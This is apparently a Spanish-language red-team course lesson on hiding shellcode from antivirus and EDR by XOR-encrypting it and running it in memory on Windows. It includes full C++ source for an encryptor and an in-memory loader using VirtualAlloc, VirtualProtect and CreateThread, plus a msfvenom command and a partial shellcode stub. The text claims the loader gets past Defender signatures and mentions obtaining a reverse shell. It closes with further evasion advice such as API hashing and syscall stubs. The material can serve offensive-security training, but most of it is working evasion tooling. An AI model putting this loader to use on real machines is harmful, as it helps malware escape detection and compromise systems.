## Introducción

Al implementar o ejecutar shellcode en un entorno monitoreado, el principal desafío es evitar la detección estática y de comportamiento mediante soluciones de seguridad como software antivirus y sistemas de detección y respuesta de puntos finales (EDR).

**Cifrado XOR** es una de las técnicas de ofuscación más simples pero aún efectivas. Transforma cada byte de una carga útil mediante una operación matemática reversible: XOR con una clave. Cuando se usa correctamente, evita la detección basada en patrones de bytes, cadenas o firmas conocidas comúnmente monitoreadas en shellcode o blobs binarios.

Este enfoque es eficaz contra el análisis estático, aunque los motores de comportamiento modernos aún pueden detectar asignaciones de memoria y comportamientos de ejecución sospechosos. Aún así, XOR sigue siendo una capa fundamental en los flujos de trabajo de ofuscación.

---

## [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-encryption-with-xor-and-execution-in-memory#user-content-how-xor-encryption-works)Cómo funciona el cifrado XOR

XOR (OR exclusivo) aplica una clave a cada byte del shellcode. Dado que XOR es simétrico, la misma operación con la misma clave puede **encriptar** y **descifrar** Los datos. Por ejemplo:

```
EncryptedByte = OriginalByte XOR KeyByte
OriginalByte  = EncryptedByte XOR KeyByte
```

Usando una tecla repetida como `"redteamexercises"`, puede ofuscar toda la carga útil manteniendo una sobrecarga mínima y compatibilidad con shellcode.

---

## [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-encryption-with-xor-and-execution-in-memory#user-content-workflow)Flujo de trabajo

![](https://images.coursestack.com/96e8cffc-ac6e-4605-b7e1-39c6c26bd2e8/ddd1b121-f035-4da4-ab5c-4d53134c6f13)

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-encryption-with-xor-and-execution-in-memory#user-content-figure-1--generate-shellcode)Figura 1 – Generar código Shell

Shellcode se puede generar utilizando herramientas como `msfvenom`, `Donut`, o cualquier generador de carga útil personalizado. Por ejemplo:

```bash
msfvenom -p windows/x64/messagebox TEXT="Hello" -f c
```

Alternativamente, puede utilizar su propio marco C2 para generar el shellcode.

---

![](https://images.coursestack.com/96e8cffc-ac6e-4605-b7e1-39c6c26bd2e8/f27f888c-03fc-4e89-96ce-ecb74d6bb400)

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-encryption-with-xor-and-execution-in-memory#user-content-figure-2--encrypting-shellcode-with-encryptorcpp)Figura 2 – Cifrado de Shellcode con `encryptor.cpp`

Este programa:

- Toma un búfer de código shell sin procesar.
- Aplica el cifrado XOR mediante una clave (`"redteamexercises"`).
- Genera uno nuevo `.h` archivo que contiene el shellcode cifrado y su tamaño.

#### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-encryption-with-xor-and-execution-in-memory#user-content-encryptorcpp)`encryptor.cpp`:

```cpp
#include <iostream>
#include <fstream>
#include <vector>
#include <string>

// XOR encryption key
const std::string key = "redteamexercises";

// Raw shellcode
unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
                            "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52";

const size_t shellcode_size = sizeof(shellcode);

// XOR encryption function
void xor_encrypt(std::vector<unsigned char>& data, const std::string& key) {
    for (size_t i = 0; i < data.size(); i++) {
        data[i] ^= key[i % key.size()];
    }
}

int main() {
    std::vector<unsigned char> encrypted(shellcode, shellcode + shellcode_size);
    xor_encrypt(encrypted, key);

    std::ofstream output("encrypted_shellcode.h");
    output << "#pragma once\n";
    output << "unsigned char encrypted_shellcode[] = {";
    for (size_t i = 0; i < encrypted.size(); i++) {
        output << "0x" << std::hex << (int)encrypted[i];
        if (i != encrypted.size() - 1) output << ", ";
    }
    output << "};\n";
    output << "const size_t shellcode_size = " << encrypted.size() << ";\n";
    std::cout << "[+] Encrypted shellcode saved to encrypted_shellcode.h\n";
    return 0;
}
```

---

![](https://images.coursestack.com/96e8cffc-ac6e-4605-b7e1-39c6c26bd2e8/db3c0e2b-32a5-4249-a235-deeea258c580)

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-encryption-with-xor-and-execution-in-memory#user-content-figure-3--run-the-encryptor)Figura 3 – Ejecute el cifrador

Compilar y ejecutar `encryptor.cpp` generar `encrypted_shellcode.h`:

---

![](https://images.coursestack.com/96e8cffc-ac6e-4605-b7e1-39c6c26bd2e8/761d7484-3ff1-4150-9256-0d1592ca6636)

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-encryption-with-xor-and-execution-in-memory#user-content-figure-4--executing-the-shellcode-with-runnercpp)Figura 4 – Ejecución del Shellcode con `runner.cpp`

El corredor:

- Incluye la carga útil cifrada.
- Lo descifra en la memoria usando la misma clave.
- Asigna memoria ejecutable.
- Ejecuta el shellcode a través de `CreateThread`.

#### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-encryption-with-xor-and-execution-in-memory#user-content-runnercpp)`runner.cpp`:

```cpp
#include <windows.h>
#include <iostream>
#include "encrypted_shellcode.h" // Include generated header

const std::string key = "redteamexercises";

// Decryption logic
void xor_decrypt(unsigned char* data, size_t size, const std::string& key) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key[i % key.size()];
    }
}

int main() {
    std::cout << "[+] Starting shellcode decryption and execution...\n";

    xor_decrypt(encrypted_shellcode, shellcode_size, key);

    void* exec_mem = VirtualAlloc(nullptr, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) {
        std::cerr << "[-] Memory allocation failed\n";
        return 1;
    }

    memcpy(exec_mem, encrypted_shellcode, shellcode_size);

    DWORD oldProtect;
    if (!VirtualProtect(exec_mem, shellcode_size, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "[-] Failed to change memory permissions\n";
        return 1;
    }

    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)exec_mem, nullptr, 0, nullptr);
    if (!hThread) {
        std::cerr << "[-] Thread creation failed\n";
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
```

---

![](https://images.coursestack.com/96e8cffc-ac6e-4605-b7e1-39c6c26bd2e8/48598b74-ab01-4c50-af7d-eedbe083dbe9)

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-encryption-with-xor-and-execution-in-memory#user-content-figure-5--running-on-windows-10-with-defender-enabled)Figura 5 – Ejecutándose en Windows 10 con Defender habilitado

Cuando el shellcode se ofusca y se ejecuta en la memoria sin tocar el disco y sin importar API peligrosas directamente en el IAT, puede eludir las firmas básicas de Defender (aunque los EDR avanzados con detección heurística aún pueden alertar).

---

### [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-encryption-with-xor-and-execution-in-memory#user-content-figure-6--reverse-shell-established)Figura 6 – Carcasa inversa establecida

Una vez ejecutado el shellcode, debes observar el comportamiento esperado, ya sea que genere un shell inverso, un cuadro de mensaje u otra acción de carga útil.

---

## [](https://redteamleaders.coursestack.com/courses/62c9b0f6-6a0a-488c-870b-4ca0ac754378/take/shellcode-encryption-with-xor-and-execution-in-memory#user-content-conclusion)Conclusión

La codificación XOR es un método de ofuscación fundamental. Es útil contra **AV basados en firmas**, pero ofrece una protección limitada contra **heurísticas o EDR conductuales**.

Para una mejor protección:

- Combine XOR con polimorfismo (cifrado aleatorio).
- Ofuscar la rutina de descifrado.
- Retrasar el descifrado o organizarlo en fragmentos.
- Utilice cargadores de regiones basados en pila o RWX.
- Mezcle hash de API y syscall stubs para evitar rastros de API de Windows.